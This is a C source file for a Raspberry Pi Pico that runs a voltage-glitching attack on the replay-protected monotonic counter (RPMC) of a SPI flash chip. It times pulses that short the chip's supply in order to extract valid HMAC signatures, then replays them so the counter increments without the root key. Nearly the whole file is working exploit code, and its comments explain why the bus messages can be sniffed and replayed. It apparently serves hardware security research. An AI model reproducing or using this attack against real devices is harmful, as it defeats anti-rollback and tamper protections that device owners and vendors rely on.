#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <inttypes.h>
#include "pico/stdlib.h"
#include "pico/binary_info.h"
#include "mbedtls/md.h"
#include "hardware/spi.h"
#include "pico/cyw43_arch.h"
#include "pico/multicore.h"
#include "rpmc_ops.h"

#define TRANSMIT_GLITCH_PIN 15

inline int rpmc_ops_spi_write(void * spi_connection, const uint8_t * write_buffer, size_t write_amount)
{
    return spi_write_blocking((spi_inst_t *)spi_connection, write_buffer, write_amount);
}

inline int rpmc_ops_spi_read(void * spi_connection, uint8_t fill_char, uint8_t * read_buffer, size_t read_amount)
{
    return spi_read_blocking((spi_inst_t *)spi_connection, fill_char, read_buffer, read_amount);
}

// This just needs the current value and an updated hmac key register
// Both of these messages are not replay proteced so the can be sniffed from the bus and then replayed
static int glitch_increment(void * const spi_connection,
                            const unsigned int cs_pin,
                            const uint8_t target_counter,
                            const uint32_t old_counter_value)
{
    const size_t signature_offset = RPMC_OP1_MSG_HEADER_LENGTH + RPMC_COUNTER_LENGTH;
    // Any size payload between 5 and RPMC_GET_MONOTONIC_COUNTER_MSG_LENGTH works
    const uint8_t get_counter_msg[5] = {
        OP1_OPCODE, // Opcode
		0x03, // CmdType
		target_counter, // CounterAddr
		0 // Reserved
    };

    for (size_t glitch_cycles = 9500; glitch_cycles <= 9700; glitch_cycles += 20) {
        uint8_t increment_msg[RPMC_INCREMENT_MONOTONIC_COUNTER_MSG_LENGTH] = {
            OP1_OPCODE, // Opcode
            0x02, // CmdType
            target_counter, // CounterAddr
            0, // Reserved
            (old_counter_value >> 24) & 0xff,
            (old_counter_value >> 16) & 0xff,
            (old_counter_value >> 8) & 0xff,
            old_counter_value & 0xff
        };
        // Just to find the signature easier
        memset(increment_msg + signature_offset, 0x42, RPMC_SIGNATURE_LENGTH);

        multicore_fifo_push_blocking(glitch_cycles);
        // Synchronize with core1
        multicore_fifo_pop_blocking();
        
        spi_transaction(spi_connection, cs_pin, increment_msg, RPMC_INCREMENT_MONOTONIC_COUNTER_MSG_LENGTH, NULL, 0);

        // Synchronize with core1 to ensure the glitch doesn't happen at a later point
        multicore_fifo_pop_blocking();
        
        sleep_us(200);
        spi_transaction(spi_connection, cs_pin, get_counter_msg, sizeof(get_counter_msg), NULL, 0);
        sleep_us(200);

        struct rpmc_status_register full_status;
        get_full_rpmc_status(spi_connection, cs_pin, &full_status);
        if (full_status.return_code == 0x04) {
            memcpy(increment_msg + signature_offset, full_status.signature, RPMC_SIGNATURE_LENGTH);
            spi_transaction(spi_connection, cs_pin, increment_msg, RPMC_INCREMENT_MONOTONIC_COUNTER_MSG_LENGTH, NULL, 0);
            poll_until_finished(spi_connection, cs_pin);
            const uint8_t status = get_rpmc_status(spi_connection, cs_pin);

            if (status == 0x80) {
                printf("Glitch with delay %u\nFull rpmc status register: ", glitch_cycles);
                for (size_t i = 0; i < sizeof(struct rpmc_status_register); i++)
                    printf("%02x", ((uint8_t *)&full_status)[i]);
                printf("\n");
                return 0;
            }
        }
    }
    return 1;
}

static int setup_increment_glitch(void * const spi_connection, const unsigned int cs_pin)
{
    const uint8_t root_key[RPMC_HMAC_KEY_LENGTH] = {0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa,
                                                    0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa,
                                                    0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa,
                                                    0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa};
    const uint8_t key_data[RPMC_KEY_DATA_LENGTH] = {0x00, 0x00, 0x00, 0x00};
    const uint8_t target_counter = 0;
    int ret = 0;

    uint8_t hmac_key_register[RPMC_HMAC_KEY_LENGTH];
    if (mbedtls_md_hmac(mbedtls_md_info_from_type(MBEDTLS_MD_SHA256), root_key, RPMC_HMAC_KEY_LENGTH, key_data, RPMC_KEY_DATA_LENGTH, hmac_key_register)) {
        printf("Error: could not generate the hmac key\n");
        return 1;
    }

    // This message is always the same for the same key data
    if (update_hmac_key_register(spi_connection, cs_pin, target_counter, hmac_key_register, key_data)) {
        printf("Error: could not update hmac key register\n");
        return 1;
    }

    uint32_t curr_counter_value;
    // This message changes depending on the key data value used in the previous update hmac key command
    // But if we catch the previous update hmac key command, we also know the get counter message
    // We just can't validate the signature without the root key. But that doesn't matter, since we can still read the counter value
    if (get_counter_value(spi_connection, cs_pin, target_counter, hmac_key_register, &curr_counter_value)) {
        printf("Error: could not get old counter values\n");
        return 1;
    }

    size_t increments = 0;
    const uint64_t start = time_us_64();
    while (increments < 1000) {
        printf("Trying to glitch %u\n", curr_counter_value);
        if (glitch_increment(spi_connection, cs_pin, target_counter, curr_counter_value)) {
            printf("Failed\n");
            ret = 1;
            break;
        }

        increments++;
    }
    const uint64_t time_taken = time_us_64() - start;

    if (increments > 0)
        printf("Incrementing the counter by %u took %" PRIu64 " us (%" PRIu64 " us per increment)\n", increments, time_taken, time_taken / increments);
    
    return ret;
}

void __time_critical_func(core1_glitch_pulldown_loop)(void)
{
    while (true) {
        uint32_t glitch_cycles = multicore_fifo_pop_blocking();
        // Synchronize with core0
        multicore_fifo_push_blocking(0);

        while (glitch_cycles-- > 0)
            ;
        
        gpio_put(TRANSMIT_GLITCH_PIN, 1);
        // Add some delay to have our gate driver actually recognize the signal
        // TODO: customize this delay and try different values
        asm volatile("nop\nnop\nnop\nnop\nnop\nnop");
        gpio_put(TRANSMIT_GLITCH_PIN, 0);

        // Synchronize with core0
        multicore_fifo_push_blocking(0);
    }
}

int main()
{
    stdio_init_all();
    if (cyw43_arch_init()) {
        printf("Wi-Fi init failed\n");
        return 1;
    }
    sleep_ms(1000);
    printf("Device is starting\n");
    
    spi_init(spi0, 1U * 1000 * 1000);
    gpio_set_function(PICO_DEFAULT_SPI_RX_PIN, GPIO_FUNC_SPI);
    gpio_set_function(PICO_DEFAULT_SPI_SCK_PIN, GPIO_FUNC_SPI);
    gpio_set_function(PICO_DEFAULT_SPI_TX_PIN, GPIO_FUNC_SPI);
    // Make the SPI pins available to picotool
    bi_decl(bi_3pins_with_func(PICO_DEFAULT_SPI_RX_PIN, PICO_DEFAULT_SPI_TX_PIN, PICO_DEFAULT_SPI_SCK_PIN, GPIO_FUNC_SPI));

    // Chip select is active-low, so we'll initialise it to a driven-high state
    gpio_init(PICO_DEFAULT_SPI_CSN_PIN);
    gpio_put(PICO_DEFAULT_SPI_CSN_PIN, 1);
    gpio_set_dir(PICO_DEFAULT_SPI_CSN_PIN, GPIO_OUT);
    // Make the CS pin available to picotool
    bi_decl(bi_1pin_with_name(PICO_DEFAULT_SPI_CSN_PIN, "SPI CS"));

    // Glitch pin shorts the voltage of the chip to ground when it is set high
    gpio_init(TRANSMIT_GLITCH_PIN);
    gpio_put(TRANSMIT_GLITCH_PIN, 0);
    gpio_set_dir(TRANSMIT_GLITCH_PIN, GPIO_OUT);
    bi_decl(bi_1pin_with_name(TRANSMIT_GLITCH_PIN, "GLITCH PIN"));

    // Setup second core to pull the glitch pin down after a recieved countdown
    multicore_reset_core1();
    multicore_launch_core1(core1_glitch_pulldown_loop);

    int ret = setup_increment_glitch(spi0, PICO_DEFAULT_SPI_CSN_PIN);

    // Don't leave the pin shorted if something goes wrong    
    gpio_put(TRANSMIT_GLITCH_PIN, 0);
    spi_deinit(spi0);

    while (true) {
        cyw43_arch_gpio_put(CYW43_WL_GPIO_LED_PIN, true);
        sleep_ms(500);
        cyw43_arch_gpio_put(CYW43_WL_GPIO_LED_PIN, false);
        sleep_ms(500);
    }

    return ret;
}
